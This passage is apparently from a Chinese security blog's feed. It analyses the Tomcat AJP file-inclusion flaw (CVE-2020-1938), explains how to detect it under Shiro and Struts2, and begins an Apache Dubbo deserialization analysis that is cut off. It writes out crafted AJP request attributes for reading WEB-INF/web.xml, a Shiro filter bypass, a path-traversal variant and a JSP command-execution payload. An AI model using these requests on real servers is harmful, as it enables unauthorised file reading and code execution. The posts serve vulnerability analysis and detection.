MVC情况一样。</p><p>所以综合来看，内置情况下只有配置开启了<code>AJP</code>并引入了<code>jasper.jar</code>才可以被利用，这种情况较少。外置情况下可以直接利用，这种情况也较少。所以我认为Spring boot出现该漏洞的可能性不大。</p><h2 id="0x05-情况四：shiro环境下"><a href="#0x05-情况四：shiro环境下" class="headerlink" title="0x05 情况四：shiro环境下"></a>0x05 情况四：shiro环境下</h2><p>经典配置下shiro过滤器会对所有路径进行过滤，对url的访问权限有如下5个属性。</p><ul><li>anon: 无需认证即可访问</li><li>authc: 需要认证才可访问</li><li>user: 点击“记住我”功能可访问</li><li>perms: 拥有权限才可以访问</li><li>role: 拥有某个角色权限才能访问</li></ul><p>假设配置如下，在未登录情况下只能访问被配置为<code>anon</code>权限的<code>login.jsp</code>，访问其他链接都会302跳转至登录页面。所以只能请求这个页面来触发漏洞。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"shiroFilter"</span> <span class="attr">class</span>=<span class="string">"org.apache.shiro.spring.web.ShiroFilterFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"securityManager"</span> <span class="attr">ref</span>=<span class="string">"securityManager"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"loginUrl"</span> <span class="attr">value</span>=<span class="string">"/login"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"unauthorizedUrl"</span> <span class="attr">value</span>=<span class="string">"/refuse.html"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"filterChainDefinitions"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            /logout = logout</span><br><span class="line">            /login.jsp = anon</span><br><span class="line">            /** = authc</span><br><span class="line">        <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"successUrl"</span> <span class="attr">value</span>=<span class="string">"/index"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但我们在自动化中如何发现被配置为<code>anon</code>权限的URL呢？实验室的<code>@背影</code>师傅给了一条很重要的提示，可以通过该漏洞设置request对象属性<code>shiroFilter: 1</code>来“关闭”shiro的拦截功能。</p><p>如果<code>request</code>对象的属性名<code>alreadyFilteredAttributeName</code>的值不为空，那么将直接交给<code>Tomcat</code>的<code>servlet</code>处理，相当于关闭了<code>shiro</code>的拦截！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/4.png" alt="判断是否已经过滤"></p><p>alreadyFilteredAttributeName变量等于<code>shiro过滤器名</code> + <code>.FILTERED</code>。</p><p>通过查看代码发现<code>shiroFilter</code>其实是<code>web.xml</code>设置的<code>shiro</code>过滤器名，这是由开发人员自定义的，故带来了新的问题。若不知道<code>shiro</code>过滤器名怎么办呢？</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/5.png" alt="已过滤属性名"></p><p>通过调试<code>shiro</code>，发现请求会被上面说的5种权限过滤器，依次匹配并处理。最重要的是它们的名字固定！于是按照同样的方法，都给它们设置上已过滤flag，即可绕过shiro的限制。具体请求构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br><span class="line">authc.FILTERED: 1</span><br><span class="line">user.FILTERED: 1</span><br><span class="line">perms.FILTERED: 1</span><br><span class="line">role.FILTERED: 1</span><br></pre></td></tr></table></figure><h2 id="0x06-情况五：Struts2环境下"><a href="#0x06-情况五：Struts2环境下" class="headerlink" title="0x06 情况五：Struts2环境下"></a>0x06 情况五：Struts2环境下</h2><p>以下分析的是Struts2 2.5.22</p><p>使用Struts2框架一般需要设置如下的全局过滤器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该过滤器默认会将后缀为<code>空</code>和<code>.action</code>的URL请求，交给<code>Struts2</code>的<code>Action</code>处理，而其他后缀就交给Tomcat默认Servlet处理，漏洞利用需要让其走后者。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/6.png" alt="通过URL获取mapping对象，决定后续处理流程"></p><p>然而在请求路径的获取上Struts2有别于其他环境，这是导致漏洞利用方式稍有不同。它通过<code>request</code>对象的<code>javax.servlet.include.servlet_path</code>属性获取，而不是<code>request.getServletPath()</code>。</p><p>org.apache.struts2.dispatcher.mapper.DefaultActionMapper#getUri()</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/7.png" alt="Struts2请求的Servlet路径是由javax.servlet.include.servlet_path属性决定"></p><p>所以我们在这里必须设置该属性值为非空非<code>.action</code>的后缀<code>test.jsp</code>,才能让Tomcat的<code>JspServlet</code>来处理。但是如果我们还是使用原来的方式读<code>/WEB-INF/web.xml</code>是行不通的，因为最终构造的路径如下是错误的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">= /test.jsp + &apos;/WEB-INF/web.xml&apos;</span><br><span class="line">= /test.jsp/WEB-INF/web.xml (路径错误)</span><br></pre></td></tr></table></figure><p>那我们能否将<code>javax.servlet.include.path_info</code>设置为<code>/../WEB-INF/web.xml</code>来吃掉<code>1.jsp</code>形成正确路径呢？答案是可以的！可能看过我之前漏洞分析文章的朋友会说，不是说路径里不能使用<code>../</code>进行跳目录么？其实是可以跳目录，只是不能跳出<code>webapps</code>而已。这里重新说明下路径校验函数<code>normalized()</code>的功能。</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/8.png" alt="normalized方法中和./和../的处理流程"></p><p>该方法的功能是中和掉路径中的<code>./</code>和<code>../</code>，比如<code>/a/.//b/../c</code>就会被中和为<code>/a/c</code>。如果最后依然存在<code>../</code>在开头，才会返回<code>null</code>，最终抛出非法路径的异常。</p><p>所以在<code>Struts2</code>框架下检测该漏洞，需要构造如下请求来绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri: /</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: /../WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /1.jsp</span><br></pre></td></tr></table></figure><h2 id="0x07-扫描演示"><a href="#0x07-扫描演示" class="headerlink" title="0x07 扫描演示"></a>0x07 扫描演示</h2><p>最后便可以将以上各个场景的特点综合起来，编写扫描工具了。这里我搭建了SpringMVC + Shiro的环境进行演示。可以发现其他的url都重定向了，只有针对shiro构造的请求是200，并成功触发漏洞！</p><p><img src="/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/9.png" alt="扫描演示"></p><h2 id="0x08-最后的话"><a href="#0x08-最后的话" class="headerlink" title="0x08 最后的话"></a>0x08 最后的话</h2><ol><li>本文只对每种环境较新版本进行分析，所以提供的扫描方案不可能适配所有版本环境，算是对精确检测做一个抛砖引玉。</li><li>每种环境下的检测方案，只考虑使用Tomcat默认存在缺陷的两个Servlet（<code>JspServlet</code>和<code>DefaultServlet</code>）来检测，更完美的方案应该是去找每种环境下其他存在缺陷的Servlet。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析</title>
      <link href="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/"/>
      <url>/articles/2020/cve-2020-1938-tomcat-ajp-lfi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>Tomcat根据默认配置(<code>conf/server.xml</code>）启动两个连接器。一个是<code>HTTP Connector</code>默认监听<code>8080</code>端口处理HTTP请求，一个<code>AJP connector</code>默认<code>8009</code>端口处理AJP请求。Tomcat处理两个协议请求区别并不大，AJP协议相当于HTTP协议的二进制优化版。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7F9C15E2-870C-45ED-914E-61663896B504.png" alt="tomcat默认配置两个连接器"></p><p><strong>本次漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。</strong> 下面我们以<code>Tomcat 8.5.47</code>来具体分析。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>当我们向Tomcat发送AJP请求时，请求会被<code>org.apache.coyote.ajp.AjpProcessor</code>，<code>AjpProcessor</code>调用<code>prepareRequest</code>方法读取AJP请求中的信息来设置request属性。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/61F07938-9006-4490-AC56-738540E76D23.png" alt="对request对象属性进行设置"></p><p>由于没有任何过滤，我们可以给<code>request</code>设置任何属性和值。本次漏洞与如下三个属性有关，为了方便后续描述统一简称为“<code>三个include属性</code>”。</p><ul><li>javax.servlet.include.request_uri</li><li>javax.servlet.include.path_info</li><li>javax.servlet.include.servlet_path</li></ul><p>最终会将封装好的<code>request</code>丢给<code>Servlet</code>容器<code>Catalina</code>处理，之后就和HTTP消息的处理一样，按照Servlet映射走。</p><h4 id="2-1-任意文件读取"><a href="#2-1-任意文件读取" class="headerlink" title="2.1 任意文件读取"></a>2.1 任意文件读取</h4><p>任意文件读取问题出现在<code>org.apache.catalina.servlets.DefaultServlet</code>这个Servlet。现在假设我们发出一个请求内容如下的AJP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jpg</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: WEB-INF/web.xml</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>通过查看servlet映射规则(<code>conf/web.xml</code>)知道，请求会走默认的<code>DefaultServlet</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>listings<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mapping for the default servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>default<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>会交给<code>org.apache.catalina.servlets.DefaultServlet</code>的<code>doGet</code>方法处理。<code>doGet</code>会调用<code>ServeResource</code>方法进行具体的资源读取操作。首先它会调用 <code>getRelativePath</code>方法获取要读取资源的相对路径，这里注意它是本次任意读取漏洞的关键，我们先往下看后续再细说它。通过<code>getResources</code>方法就可以获取到了对应路径的Web资源对象了。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/443FAD03-C388-4EC9-BB1C-90FA1AA30396.png" alt="ServeResource文件读取操作"></p><p>最后资源对象的内容随着<code>resourceBody</code>被写入了<code>ostream</code>流对象中返回给客户端。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/41165822-5864-456D-82D2-F537D3BEA2DB.png" alt="资源对象内容被写入ostream"></p><p>接下来我们来看漏洞真正核心，<code>org.apache.catalina.servlets.DefaultServlet</code>类的<code>getRelativePath()</code>，它负责获取资源的相对路径。由于我们AJP请求设置<code>javax.servlet.include.request_uri</code>属性值为<code>/</code>不为<code>null</code>。故资源<br>的相对路径构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= javax.servlet.include.path_info + javax.servlet.include.path_info</span><br><span class="line">= / + WEB-INF/web.xml</span><br><span class="line">= /WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/getRelativePath.png" alt="getRelativePath根据三个include属性获取资源相对路径"></p><p>这就导致我们虽然请求的是<code>/docs/test.jpg</code>文件内容，而实际上返回了<code>/docs/WEB-INF/web.xml</code>文件的内容。</p><p>至此大家可能有两个疑问</p><p><strong>问题1：为何Tomcat处理HTTP协议不存在该问题？</strong></p><p>答：因为在HTTP请求中，我们无法控制request对象三个<code>include</code>属性的值，而在AJP请求中可以。</p><p><strong>问题2：为何无法跳出webapps目录读文件呢？</strong></p><p><code>DefaultServlet</code>在读取资源时</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/2A1EE7C0-797C-4EF0-A60C-62BEE428403E.png" alt="跳目录读文件"></p><p>会调用<code>org.apache.tomcat.util.http.RequestUtil</code>工具类中的<code>normalize</code>方法来对路径进行校验，如果存在<code>./</code>或<code>../</code>则会返回<code>null</code>,最终会抛出一个非法路径的异常终止文件读取操作。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/473B80B4-0C17-420D-B889-7017DD18B666.png" alt="normalize对路径进行校验导致无法跳目录"></p><h4 id="2-2-任意代码执行"><a href="#2-2-任意代码执行" class="headerlink" title="2.2 任意代码执行"></a>2.2 任意代码执行</h4><p>任意代码执行问题出现在<code>org.apache.jasper.servlet.JspServlet</code>这个servlet，假设我们发出一个请求内容如下的AJP请求,让Tomcat执行<code>/docs/test.jsp</code>，但实际上它会将<code>code.txt</code>当成jsp来解析执行.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RequestUri：/docs/test.jsp</span><br><span class="line">javax.servlet.include.request_uri: /</span><br><span class="line">javax.servlet.include.path_info: code.txt</span><br><span class="line">javax.servlet.include.servlet_path: /</span><br></pre></td></tr></table></figure><p>code.txt内容如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.util.List&lt;String&gt; commands = <span class="keyword">new</span> java.util.ArrayList&lt;String&gt;();</span><br><span class="line">commands.add(<span class="string">"/bin/bash"</span>);</span><br><span class="line">commands.add(<span class="string">"-c"</span>);</span><br><span class="line">commands.add(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">java.lang.ProcessBuilder pb = <span class="keyword">new</span> java.lang.ProcessBuilder(commands);</span><br><span class="line">pb.start();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>按照映射规则,我们的请求会被<br><code>org.apache.jasper.servlet.JspServlet</code>进行处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.jasper.servlet.JspServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>fork<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>xpoweredBy<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>3<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">&lt;!-- The mappings for the JSP servlet --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>jsp<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jspx<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于<code>javax.servlet.include.servlet_path</code>值为<code>/</code>不为<code>null</code>,所以根据代码逻辑我们jsp文件的路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jspUri = javax.servlet.include.servlet_path + javax.servlet.include.path_info</span><br><span class="line">jspUri = / + code.txt</span><br><span class="line">jspUri = /code.txt</span><br></pre></td></tr></table></figure><p>可见<code>jspUri</code>是客户端可控。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/7EE0D33F-5FEA-4F9F-A944-9F3FA1CE1C4D.png" alt="jspUri的构造"></p><p>由我们控制的<code>jspuri</code>被封装成了一个<code>JspServletWrapper</code>添加到了Jsp运行上下文<code>JspRuntimeContext</code>中.最后<code>wrapper.service()</code>会编译<code>code.txt</code>,并执行它的<code>_jspService()</code>方法来处理当前请求，我们的代码被执行。</p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/4D7B7BDF-CAFB-43F7-BF81-D4AB3EE44DFF.png" alt="code.txt被tomcat编译执行"></p><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/23BFC3AE-EC40-4DF3-AD0E-913A913B3F9E.png" alt="code.txt被tomcat编译执行"></p><p>综上整个过程就清晰了，简而言之就是我们发送AJP请求，请求的是<code>/docs/test.jsp</code>这个jsp,但是由于那三个include属性可控,我们可以将<code>test.jsp</code>对应的服务器脚本文件改为了<code>code.txt</code>。<br>导致tomcat把我们的<code>code.txt</code>当jsp文件编译运行，导致代码执行。</p><p>最后给大家提两个问题：</p><p><strong>问题1: 请求的/docs/test.jsp需要在web目录下真是存在么？</strong></p><p>答： 不需要，我们只是为了让请求路径命中<code>org.apache.catalina.servlets.DefaultServlet</code>这个servlet的匹配规则。</p><p><strong>问题2: 如果tomcat不解析任何jsp,jspx等后缀，或者以它们为view的模板，还能触发漏洞么？如果可以又该如何触发？</strong></p><p>PS：这个问题是一个师傅留给我的，觉得很有意思，分享给大家思考，有想法的可以留言讨论。</p><h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>Tomcat在8.5.51版本做了如下修复 ：</p><ol><li>默认不开启AJP</li><li>默认只监听本地ip</li><li>强制设置认证secret</li><li>代码层面主要在<code>AjpProcessor</code>类的<code>prepareRequest</code>方法封装<code>requst</code>对象时采用了白名单，只添加已知属性。这样<code>三个include属性</code>不再被客户端控制，漏洞修复。</li></ol><p><img src="/articles/2020/cve-2020-1938-tomcat-ajp-lfi/E57AE140-7077-4F97-AEBD-5011AE8D8BCE.png" alt="修复代码"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ" target="_blank" rel="noopener">【WEB安全】Tomcat-Ajp协议漏洞分析</a></li><li><a href="https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/b99fba5bd796d876ea536e83299603443842feba</a></li><li><a href="https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2" target="_blank" rel="noopener">https://github.com/apache/tomcat/commit/40d5d93bd284033cf4a1f77f5492444f83d803e2</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-17564:Apache dubbo HTTP协议反序列化漏洞分析</title>
      <link href="/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/"/>
      <url>/articles/2020/cve-2019-17564-dubbo-http-deserialization-vulnerability/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Apache dubbo是一个是基于Java的高性能开源RPC框架。它支持dubbo，http,rmi,hessian等协议。本次问题出现在dubbo开启http协议后，会将消费者提交的<code>request</code>请求，在无安全校验的情况下直接交给了<code>spring-web.jar</code>进行处理，最终<code>request.getInputStream()</code>被反序列化,故存在反序列化漏洞。下面我们来调试分析代码。</p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li><li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li><li>Apache Dubbo = 2.5.x </li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><ul><li>OS: Mac OSX</li><li>JDK: 1.8.0_191</li><li>Dubbo: 2.7.3</li></ul><p>环境搭建这里我选择官方的<code>samples</code>中的<code>dubbo-samples-http</code></p><p><a href="https://github.com/apache/dubbo-samples/" target="_blank" rel="noopener">https://github.com/apache/dubbo-samples/</a></p><p>源码下载后将<code>pom.xml</code>中指定的dubbo版本修改为<code>2.7.3</code>,同时加入<code>commons-collections4-4.0.jar</code>方便测试。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source.level</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">target.level</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target.level</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 修改dubbo版本为2.7.3 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dubbo.version</span>&gt;</span>2.7.3<span class="tag">&lt;/<span class="name">dubbo.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>4.3.16.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">junit.version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">junit.version</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">&lt;!-- 添加一个可用的Gadget到classpath --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span 